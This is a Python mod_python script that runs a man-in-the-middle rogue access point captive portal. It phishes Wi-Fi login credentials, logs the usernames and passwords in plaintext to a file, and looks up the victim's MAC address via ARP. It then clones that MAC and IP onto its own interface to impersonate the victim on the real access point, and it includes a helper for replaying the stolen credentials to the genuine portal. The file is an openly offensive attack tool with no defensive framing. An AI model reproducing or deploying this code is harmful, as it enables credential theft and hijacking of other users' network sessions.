from subprocess import *
import logging
from mod_python import apache
from mod_python import Session, util, apache
import threading
import sys
import urllib2

MY_url = "https://192.168.1.116/login.html"
AP_AUTH = threading.Lock()
INT_val = "wlan1"
RD_val = "http://www.google.com" # portal redirect page
POST_val = "username=%s&password=%s"
ESSID_val = "" # value of the ap essid 
AP_val = "" # value of the ap mac address
RT_val = "" # value of default route
HW_val = "" # by script
IP_val = "" # by script

WS_val = "1.1.1.1" # web server address
URL_val = "https://%s/login.html"%(WS_val)
# route  [-v] [-A family] add [-net|-host] target [netmask Nm] [gw Gw] [metric N] [mss M] [window W] [irtt I] [reject] [mod] [dyn] [reinstate] [[dev] If]
down_int = "/sbin/ifconfig %s down"%(INT_val)
#set_hw = "/sbin/ifconfig %s hw ether %s"%(INT_val, HW_val)
#set_ip = "/sbin/ifconfig %s inet %s/24"%(INT_val, IP_val)
up_int = "/sbin/ifconfig %s up"%(INT_val)
ap_auth_cmd = "/sbin/iwconfig %s essid %s ap %s"%(INT_val, ESSID_val, AP_val)
set_route = "/sbin/route add -host %s/24 dev %s"%(WS_val,INT_val)

HEADERS = {
    "Host":WS_val,
    "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1",
    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language":"en-us,en;q=0.5",
    "Accept-Encoding":"gzip,deflate",
    "Accept-Charset":"ISO-8859-1,utf-8;q=0.7,*;q=0.7",
    "Keep-Alive":"300",
    "Content-Type":" application/x-www-form-urlencoded",
    "Proxy-Connection":"keep-alive"
}

class DoNothingRedirectHandler(urllib2.HTTPRedirectHandler):
	def http_error_302(self, req, fp, code, msg, headers):   
		return  headers


def run_cmd(cmd_str):
	x = Popen(cmd_str.split(), stdout=PIPE )
	return x.stdout.read()

get_macs = lambda x: [(i.split()[0], i.split()[2]) for i in x]

logging.basicConfig(level=logging.DEBUG
        ,format='%(asctime)s [%(levelname)s] %(message)s'
        ,datefmt='%d %b %y %H:%M'
        ,filename='/tmp/mitm_ap_page.log'
        ,filemode='a')
def authenticate(req, buttonClicked, err_flag, err_msg, info_flag, redirect_url, username, password):
	logging.debug("Username (%s %s %s"%(redirect_url, username, password))
	arp = run_cmd('/usr/sbin/arp').splitlines()
	if len(arp) == 0:
		return apache.OK
	macs = set(get_macs(arp[1:-1]))
	mac_map = {}
	for i in macs:
		mac_map[i[0]] = i[1]	
	ip = req.get_remote_host()
	if not ip in mac_map:
		return apache.OK
	logging.debug("Username: %s Password: %s Ip: %s Mac: %s"%(username, password, ip, mac_map[ip]))
	post_str = POST_val%(username,password)
	set_interface(ip, mac_map[ip])
	#result = send_credentials(URL_val, headers,post_str)
	#if result == "Success":
	#	req.headers_out['location'] =  RD_val
	#	req.status = apache.HTTP_MOVED_TEMPORARILY
	#	req.headers_out.add('Location:', RD_val)
	#	req.send_http_header()
	#	return 
	#return 
	req.headers_out['location'] =  MY_url
	req.status = apache.HTTP_MOVED_TEMPORARILY
	req.send_http_header()
	

def set_interface(ip, mac):
	AP_AUTH.acquire()
	run_cmd(down_int)
	try:
		set_hw = "ifconfig %s hw ether %s"%(INT_val, mac)
		set_ip = "ifconfig %s inet %s/24"%(INT_val, ip)
		run_cmd(set_hw)
		run_cmd(set_ip)
		run_cmd(up_int)
		run_cmd(ap_auth_cmd)
		run_cmd(set_route)
	except:
		logging.debug(sys.exc_info()[2])
	AP_AUTH.release()

def send_credentials(url, headers, data):
	opener = urllib2.build_opener(DoNothingRedirectHandler())
	req = urllib2.request(url, headers=headers, data=data)
	rsp = opener.open(req)
	if rsp.has_header("Location"):
		return "Success"
	return rsp
